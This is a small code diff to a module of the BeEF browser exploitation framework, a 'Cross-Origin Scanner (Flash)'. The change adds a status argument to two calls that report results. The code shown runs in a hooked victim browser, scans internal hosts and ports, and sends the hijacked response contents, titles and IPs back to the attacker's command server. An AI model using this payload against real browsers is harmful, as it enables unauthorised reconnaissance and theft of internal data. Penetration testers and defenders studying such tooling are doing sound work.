@@ -123,7 +123,7 @@ beef.execute(function() {
               'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +
 
               'if (data.match("securityErrorHandler")) {' +
-              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive");' +
+              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive", beef.are.status_success());' +
               '}' +
 
               'if (!data.match("Hijacked Contents:")) return;' +
@@ -135,7 +135,7 @@ beef.execute(function() {
               '}' +
 
               'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
-              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
+              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response, beef.are.status_success());' +
             ' }', url);
             } catch(e) {
               beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
